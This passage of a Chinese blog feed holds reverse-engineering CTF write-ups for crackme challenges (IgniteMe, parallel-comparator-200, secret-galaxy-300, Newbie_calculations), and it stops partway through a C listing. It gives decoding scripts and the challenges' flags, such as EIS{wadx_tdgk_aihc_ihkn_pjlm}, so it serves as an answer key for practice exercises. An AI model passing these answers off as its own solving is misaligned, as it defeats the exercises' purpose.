alt="在这里插入图片描述"><br>此时我们就看看encode这个东西，并且我们还可以知道key的值为12（十六进制），enflag为izwhroz””w”v.K”.Ni这一串字符。<br><img src="https://img-blog.csdnimg.cn/20210101130929271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就来编个脚本来进行解密：<br><img src="https://img-blog.csdnimg.cn/20210102105252760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时就可以了。</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>一个小知识吧，就是有时候你要加上括号（符号运算的优先级）平时我们是并不怎么去记忆这些符号运算级的，所以我们加上括号的话，就可以避免这些了。</p><hr /><h1 id="IgniteMe"><a href="#IgniteMe" class="headerlink" title="IgniteMe"></a>IgniteMe</h1><p>发现是个exe文件（不错，好久没有遇到了）<br>点开程序和其它的一样，没什么不同之处：<br><img src="https://img-blog.csdnimg.cn/20210102115900862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是一些基本信息，再来看看ida里面有些什么：<br><img src="https://img-blog.csdnimg.cn/20210102120304707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>眼尖的我们就能一眼看到我们需要哪里，它说，开始是’EIS{‘末尾是’}‘，这个东西，还有关键函数sub_4011C0(v12)：<br><img src="https://img-blog.csdnimg.cn/20210102121636991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后根据这个就可以进行解密了（来个脚本）<br>通过分析这个函数，我们可以发现它不允许有小写的字母，如果是大写会变成小写，然后来个异或进行加密（对byte_4420B0进行异或，还有个sub_4013C0(v8[i])函数里的异或），那我们就也来个这样的加密：<br><img src="https://img-blog.csdnimg.cn/20210102124246196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后加上一个EIS{和}就可以了。<br>最后的flag是EIS{wadx_tdgk_aihc_ihkn_pjlm}</p><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p>这道题也没什么知识点，主要还是分析能力，还有一个要强调的地方，就是括号的使用，多用括号，出错的概率就小了很多，因为很多的地方都是因为没有括号，所以导致脚本的编写的结果会出错。</p><hr /><p>望诸君共勉！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1450630238&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>parallel-comparator-200 &amp; secret-galaxy-300 &amp; Newbie_calculations</title>
      <link href="posts/1c1f83f3/"/>
      <url>posts/1c1f83f3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="parallel-comparator-200"><a href="#parallel-comparator-200" class="headerlink" title="parallel-comparator-200"></a>parallel-comparator-200</h1><p>下载开一看竟然是个C语言的代码，很少见呀！<br>话不多说，来看看究竟有什么不同的地方：<br><img src="https://img-blog.csdnimg.cn/20201230200449935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样我们就有了个大致了解，我们就看看这个赋值是怎么运作的。<br><img src="https://img-blog.csdnimg.cn/20201230201236142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就需要看看*(char *)result这个东西了，它其实是个上面定义的一个函数：<br><img src="https://img-blog.csdnimg.cn/20201230201420811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们分析可知argument[0]是个随机数（但其实实际上并不是随机数）<br>它的值是个108（调试时可以得到这个值，或着用爆破来实际看一下它的值究竟是个什么）<br><img src="https://img-blog.csdnimg.cn/20201230203927276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而我们也可以发现just_a_string这个原始数据是没有用的，这个其实是下面比较的事，不在我们的考虑范围之内。<br>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">d = [<span class="number">0</span>, <span class="number">9</span>, -<span class="number">9</span>, -<span class="number">1</span>, <span class="number">13</span>, -<span class="number">13</span>, -<span class="number">4</span>, -<span class="number">11</span>, -<span class="number">9</span>, -<span class="number">1</span>, -<span class="number">7</span>, <span class="number">6</span>, -<span class="number">13</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">9</span>, -<span class="number">13</span>, -<span class="number">11</span>, <span class="number">6</span>, -<span class="number">7</span>]</span><br><span class="line">a = <span class="number">108</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">123</span>):</span><br><span class="line">        <span class="keyword">if</span> (a + d[i]) ^ k == <span class="number">0</span>:</span><br><span class="line">            print(<span class="built_in">chr</span>(k),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>这道题考的是代码审计，看的是我们看代码是否够精准，是否够准确，有一些函数我也看不懂，但我们也不用全都弄懂，只要我们能够看到我们需要的进行分析，然后编写脚本来进行破解。</p><hr /><h1 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h1><p>来大致看看信息（看看会不会有所发现）<br><img src="https://img-blog.csdnimg.cn/20201230205353175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有太大的发现，那我们就用ida打开去看看呗。<br><img src="https://img-blog.csdnimg.cn/2020123021035829.png" alt="在这里插入图片描述"><br>先看看print_starbase((int)&amp;starbase);这个呗。<br><img src="https://img-blog.csdnimg.cn/20201230210250957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来来看看看fill_starbase((int)&amp;starbase);<br><img src="https://img-blog.csdnimg.cn/20201230210638818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再仔细看了一番，第一步查看信息的时候，它就提示尝试用ollydbg，其实上面应该是个结构体，而我们就需要去看看结构体内的信息：<br>大致用od运行一遍看一下是个什么：<br><img src="https://img-blog.csdnimg.cn/20201230211632758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实再看看ida就会发现结构体里的数据没有完全被打印出来，这就需要我们去看看内存里存储的是什么了，不过ida里如发现它少打的字符所在位置：</p><p><img src="https://img-blog.csdnimg.cn/20201230215314912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201230214436256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>突然发现了这个函数（这个是真的脑洞啊！！！）<br><img src="https://img-blog.csdnimg.cn/20201230215037333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我就用od找道这个地址进行调试，真不容易呀！</p><hr /><h1 id="Newbie-calculations"><a href="#Newbie-calculations" class="headerlink" title="Newbie_calculations"></a>Newbie_calculations</h1><p>我们打开这个文件，会发现输入的东西什么也不会显示出来，这点需要我们留下心。<img src="https://img-blog.csdnimg.cn/20201231194712770.png" alt="在这里插入图片描述"><br>然后我们常规操作（ida打开）我们是可以先用PE看看信息的。看到main函数是有点长的，我们就看最后的判断：<img src="https://img-blog.csdnimg.cn/20201231200507918.png" alt="在这里插入图片描述"><br>此时我们就去看看sub_401C7F（其实它是可以猜出来的，就是一个输出，我们也就不去看了）<br>而上面我们可以看到有很多函数，这点是有点工作量（其实就几个函数，我们都给它分析一下就行了）<br><img src="https://img-blog.csdnimg.cn/20201231204911518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先来看看sub_401000这个函数，它其实就是讲两个数相加，a1=a1+a2，既然知道了第一个函数的作用，那我们就来看看第二个函数的作用：<img src="https://img-blog.csdnimg.cn/20201231205606189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那这个函数我们就应该知道它是个什么函数了，它有什么作用呢？循环了a2次，有a2个a1个相加，那就是a1*a2了呗。<br>那来来看看看sub_401220这个函数吧：<br><img src="https://img-blog.csdnimg.cn/20201231211717592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个其实就是减法了！<br>这样的话，就是再主函数里的那些代码我们就可以看懂了，然后我们就可以去编写一个脚本了，不过编写的话是有点麻烦的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">100</span>, <span class="number">97</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">52</span>, <span class="number">100</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">50</span>, <span class="number">54</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">52</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">97</span>, <span class="number">49</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>]</span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">a += <span class="built_in">chr</span>(i)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>这个s是手动计算上面的值，不建议这样（实在没办法也可以）<br>而我们是可以直接复制粘贴到C里面，改几个东西就行了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v10[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">    v10[i] = <span class="number">1</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your flag is:&quot;</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">0</span>], <span class="number">1000000000</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">999999950</span>);</span><br><span class="line">  v10[<span class="number">0</span>]=mul(v3, <span class="number">2</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">1</span>], <span class="number">5000000</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">6666666</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">1666666</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">45</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">2</span>);</span><br><span class="line">  v10[<span class="number">1</span>]=add(v3, <span class="number">5</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">2</span>], <span class="number">1000000000</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">999999950</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">2</span>);</span><br><span class="line">  v10[<span class="number">2</span>]=add(v3, <span class="number">2</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">3</span>], <span class="number">55</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">3</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">4</span>);</span><br><span class="line">  v10[<span class="number">3</span>]=sub(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">4</span>], <span class="number">100000000</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">99999950</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">2</span>);</span><br><span class="line">  v10[<span class="number">4</span>]=add(v3, <span class="number">2</span>);</span><br><span class="line">  v3 = sub(v10[<span class="number">5</span>], <span class="number">1</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">1000000000</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">55</span>);</span><br><span class="line">  v10[<span class="number">5</span>]=sub(v3, <span class="number">3</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">6</span>], <span class="number">1000000</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">999975</span>);</span><br><span class="line">  v10[<span class="number">6</span>]=mul(v3, <span class="number">4</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">7</span>], <span class="number">55</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">33</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">44</span>);</span><br><span class="line">  v10[<span class="number">7</span>]=sub(v3, <span class="number">11</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">5</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">8</span>);</span><br><span class="line">  v10[<span class="number">8</span>]=add(v3, <span class="number">9</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">9</span>], <span class="number">0</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">0</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">11</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">11</span>);</span><br><span class="line">  v10[<span class="number">9</span>]=add(v3, <span class="number">53</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">10</span>], <span class="number">49</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">2</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">4</span>);</span><br><span class="line">  v10[<span class="number">10</span>]=sub(v3, <span class="number">2</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">11</span>], <span class="number">1000000</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">999999</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">4</span>);</span><br><span class="line">  v10[<span class="number">11</span>]=add(v3, <span class="number">50</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">12</span>], <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">10</span>);</span><br><span class="line">  v10[<span class="number">12</span>]=add(v3, <span class="number">32</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">13</span>], <span class="number">10</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">5</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">8</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">9</span>);</span><br><span class="line">  v10[<span class="number">13</span>]=add(v3, <span class="number">48</span>);</span><br><span class="line">  v3 = sub(v10[<span class="number">14</span>], <span class="number">1</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">-294967296</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">55</span>);</span><br><span class="line">  v10[<span class="number">14</span>]=sub(v3, <span class="number">3</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">15</span>], <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">2</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">3</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">4</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">5</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">6</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">7</span>);</span><br><span class="line">  v10[<span class="number">15</span>]=add(v3, <span class="number">20</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">16</span>], <span class="number">10</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">5</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">8</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">9</span>);</span><br><span class="line">  v10[<span class="number">16</span>]=add(v3, <span class="number">48</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">17</span>], <span class="number">7</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">6</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">5</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">4</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">3</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">2</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">1</span>);</span><br><span class="line">  v10[<span class="number">17</span>]=add(v3, <span class="number">20</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">18</span>], <span class="number">7</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">2</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">4</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">3</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">6</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">5</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">1</span>);</span><br><span class="line">  v10[<span class="number">18</span>]=add(v3, <span class="number">20</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">19</span>], <span class="number">1000000</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">999999</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">4</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">50</span>);</span><br><span class="line">  v10[<span class="number">19</span>]=sub(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = sub(v10[<span class="number">20</span>], <span class="number">1</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">-294967296</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">49</span>);</span><br><span class="line">  v10[<span class="number">20</span>]=sub(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = sub(v10[<span class="number">21</span>], <span class="number">1</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">1000000000</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">54</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = 